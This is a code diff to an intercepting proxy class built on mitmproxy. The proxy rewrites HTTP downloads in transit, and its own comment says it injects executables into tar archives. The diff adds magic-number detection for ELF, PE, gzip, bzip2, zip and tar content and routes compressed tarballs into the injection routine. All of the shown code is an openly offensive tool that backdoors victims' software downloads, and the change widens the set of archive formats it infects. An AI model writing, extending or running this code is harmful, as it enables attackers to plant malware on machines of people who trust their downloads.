@@ -103,7 +103,27 @@ class proxyMaster(controller.Master):
         self.zipMimeTypes = (['application/x-zip-compressed'], ['application/zip'])
 
         #USED NOW
-        self.supportedBins = ('MZ', '7f454c46'.decode('hex'))
+        self.magicNumbers = {
+               'elf': {
+                'number': '7f454c46'.decode('hex'),
+                'offset': 0
+            }, 'pe': {
+                'number': 'MZ',
+                'offset': 0
+            }, 'gz': {
+                'number': '1f8b'.decode('hex'),
+                'offset': 0
+            }, 'bz': {
+                'number': 'BZ',
+                'offset': 0
+            }, 'zip': {
+                'number': '504b0304'.decode('hex'),
+                'offset': 0
+            }, 'tar': {
+                'number': 'ustar',
+                'offset': 257
+            }
+        }
 
     def run(self):
         try:
@@ -113,7 +133,13 @@ class proxyMaster(controller.Master):
         except KeyboardInterrupt:
             self.shutdown()
 
-    def tar_files(self, aTarFileBytes):
+    def bytes_have_format(self, bytess, formatt):
+        number = self.magicNumbers[formatt]
+        if bytess[number['offset']:number['offset'] + len(number['number'])] == number['number']:
+            return True
+        return False
+
+    def tar_files(self, aTarFileBytes, formatt):
         "When called will unpack and edit a Tar File and return a tar file"
 
         print "[*] TarFile size:", len(aTarFileBytes) / 1024, 'KB'
@@ -131,22 +157,25 @@ class proxyMaster(controller.Master):
                 print '[!] Not a tar file'
                 return aTarFileBytes
 
+            compressionMode = ':'
+            if formatt == 'gz':
+                compressionMode = ':gz'
+            if formatt == 'bz':
+                compressionMode = ':bz2'
+
             tarFile = None
-            compressionMode = ''
-            for mode in [':gz', ':bz2', ':']:
-              try:
-                  tarFileStorage.seek(0)
-                  tarFile = tarfile.open(fileobj=tarFileStorage, mode='r'+mode)
-                  compressionMode = mode
-                  break
-              except tarfile.ReadError:
-                  pass
+            try:
+                tarFileStorage.seek(0)
+                tarFile = tarfile.open(fileobj=tarFileStorage, mode='r'+compressionMode)
+            except tarfile.ReadError:
+                pass
 
             if tarFile is None:
                 print '[!] Not a tar file'
                 return aTarFileBytes
 
             print '[*] Tar file contents and info:'
+            print '[*] Compression:', formatt
 
             members = tarFile.getmembers()
             for info in members:
@@ -613,13 +642,12 @@ class proxyMaster(controller.Master):
 
             # if it's a tar file, it injects executables inside,
             # otherwise just returns the same bytes it was given
-            msg.content = self.tar_files(msg.content)
 
-            if msg.headers['content-type'] in self.zipMimeTypes and self.convert_to_Bool(self.CompressedFiles) is True:
+            if self.bytes_have_format(msg.content, 'zip') and self.convert_to_Bool(self.CompressedFiles) is True:
                     aZipFile = msg.content
                     msg.content = self.zip_files(aZipFile)
 
-            elif msg.content[:2] in self.supportedBins or msg.content[:4] in self.supportedBins:
+            elif self.bytes_have_format(msg.content, 'pe') or self.bytes_have_format(msg.content, 'elf'):
 
                 orgFile = msg.content
 
@@ -643,6 +671,14 @@ class proxyMaster(controller.Master):
                 os.close(fd)
 
                 os.remove(tmpFile)
+            elif self.bytes_have_format(msg.content, 'gz') and self.convert_to_Bool(self.CompressedFiles) is True:
+                # assume .tar.gz for now
+                msg.content = self.tar_files(msg.content, 'gz')
+            elif self.bytes_have_format(msg.content, 'bz') and self.convert_to_Bool(self.CompressedFiles) is True:
+                # assume .tar.bz for now
+                msg.content = self.tar_files(msg.content, 'bz')
+            elif self.bytes_have_format(msg.content, 'tar') and self.convert_to_Bool(self.CompressedFiles) is True:
+                msg.content = self.tar_files(msg.content, 'tar')
 
             msg.reply()
 
